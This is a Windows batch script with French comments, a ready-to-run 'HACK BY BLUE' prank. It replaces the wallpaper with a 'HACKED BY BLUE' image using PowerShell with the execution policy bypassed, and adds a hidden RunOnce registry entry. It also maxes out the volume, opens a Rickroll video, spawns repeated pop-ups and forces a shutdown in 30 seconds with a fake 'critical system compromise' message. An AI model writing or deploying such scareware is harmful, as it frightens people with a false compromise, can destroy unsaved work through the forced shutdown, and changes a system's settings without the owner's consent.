@echo off
setlocal enabledelayedexpansion
title HACK BY BLUE

set "DIR=%TEMP%\BlueFakeHack"
set "WALL=%DIR%\wallpaper.bmp"
set "OLD=%DIR%\old.txt"
set "VBS=%DIR%\popup.vbs"

:: Lien de la video YouTube (Rickroll)
set "YT_URL=https://www.youtube.com/watch?v=dQw4w9WgXcQ"

:: Si tu as le fichier .mp3 en local, met le chemin ici (ex: C:\Users\Arthur\Music\rickroll.mp3).
:: Si c'est vide, il ouvrira la page YouTube directement.
set "AUDIO_LOCAL="

if not exist "%DIR%" mkdir "%DIR%"

:: ==================================================
:: 1. SAUVEGARDE DU FOND D'ECRAN ACTUEL
:: ==================================================
powershell -NoProfile -Command "$p=(Get-ItemProperty 'HKCU:\Control Panel\Desktop').Wallpaper; Set-Content '%OLD%' $p"

:: ==================================================
:: 2. GENERATION ET APPLICATION DE L'IMAGE GLITCH
:: ==================================================
> "%DIR%\setup.ps1" echo Add-Type -AssemblyName System.Drawing
>> "%DIR%\setup.ps1" echo $b = New-Object System.Drawing.Bitmap(1920, 1080)
>> "%DIR%\setup.ps1" echo $g = [System.Drawing.Graphics]::FromImage($b)
>> "%DIR%\setup.ps1" echo $g.Clear([System.Drawing.Color]::Black)
>> "%DIR%\setup.ps1" echo $f = New-Object System.Drawing.Font('Consolas', 95, [System.Drawing.FontStyle]::Bold)
>> "%DIR%\setup.ps1" echo $bCyan = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Cyan)
>> "%DIR%\setup.ps1" echo $bRed = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red)
>> "%DIR%\setup.ps1" echo $bWhite = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
>> "%DIR%\setup.ps1" echo $g.DrawString('HACKED BY BLUE', $f, $bCyan, 385, 480)
>> "%DIR%\setup.ps1" echo $g.DrawString('HACKED BY BLUE', $f, $bRed, 415, 480)
>> "%DIR%\setup.ps1" echo $g.DrawString('HACKED BY BLUE', $f, $bWhite, 400, 480)
>> "%DIR%\setup.ps1" echo $g.Dispose()
>> "%DIR%\setup.ps1" echo $b.Save('%WALL%')
>> "%DIR%\setup.ps1" echo $b.Dispose()
>> "%DIR%\setup.ps1" echo $code = 'using System.Runtime.InteropServices; public class WP { [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'
>> "%DIR%\setup.ps1" echo Add-Type -TypeDefinition $code
>> "%DIR%\setup.ps1" echo [WP]::SystemParametersInfo(20, 0, '%WALL%', 3)

powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%\setup.ps1"

:: ==================================================
:: 3. CREATION DU SCRIPT DE RESTAURATION (POUR LE REDEMARRAGE)
:: ==================================================
> "%DIR%\restore.ps1" echo $p = Get-Content '%OLD%'
>> "%DIR%\restore.ps1" echo if (-not $p) { $p = 'C:\Windows\Web\Wallpaper\Windows\img0.jpg' }
>> "%DIR%\restore.ps1" echo $code = 'using System.Runtime.InteropServices; public class WP { [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'
>> "%DIR%\restore.ps1" echo Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
>> "%DIR%\restore.ps1" echo [WP]::SystemParametersInfo(20, 0, $p, 3)
>> "%DIR%\restore.ps1" echo Start-Sleep -Seconds 2
>> "%DIR%\restore.ps1" echo Remove-Item '%DIR%' -Recurse -Force

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v BlueRestore /t REG_SZ /d "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%DIR%\restore.ps1\"" /f >nul

:: ==================================================
:: 4. CREATION DU FICHIER VBS POUR LES POP-UPS
:: ==================================================
> "%VBS%" echo MsgBox "hacké !", 48, "HACK BY BLUE"

:: ==================================================
:: 5. REGLAGE DU VOLUME MONTE A 100%
:: ==================================================
powershell -NoProfile -Command "$w = New-Object -ComObject WScript.Shell; for ($i=0; $i -lt 50; $i++) { $w.SendKeys([char]175) }; $code='using System.Runtime.InteropServices; public class Vol { [DllImport(\"winmm.dll\")] public static extern int waveOutSetVolume(IntPtr h, uint v); }'; Add-Type -TypeDefinition $code; [Vol]::waveOutSetVolume([IntPtr]::Zero, 0xFFFFFFFF)" >nul 2>&1

:: ==================================================
:: 6. LECTURE DU SON / OUVERTURE YOUTUBE
:: ==================================================
if defined AUDIO_LOCAL (
    if exist "%AUDIO_LOCAL%" (
        start "" /b powershell -NoProfile -WindowStyle Hidden -Command "$m = New-Object -ComObject WMPlayer.OCX; $m.URL = '%AUDIO_LOCAL%'; $m.controls.play(); Start-Sleep -Seconds 35"
    )
) else (
    start "" "%YT_URL%"
)

:: ==================================================
:: 7. DECLENCHEMENT DE L'EXTINCTION INEVITABLE
:: ==================================================
shutdown /s /t 30 /c "ERREUR SYSTEME CRITIQUE : COMPROMISSION CONFIRMEE"

:: ==================================================
:: 8. BOUCLE VISUELLE ET POP-UPS
:: ==================================================
for /L %%N in (30,-1,1) do (
    cls
    echo ==================================================
    echo                 HACK BY BLUE
    echo ==================================================
    echo.
    echo   EXTINCTION DU SYSTEME DANS %%N SECONDE^(S^)...
    echo.
    echo ==================================================
    
    start wscript.exe "%VBS%"
    ping 127.0.0.1 -n 2 >nul
)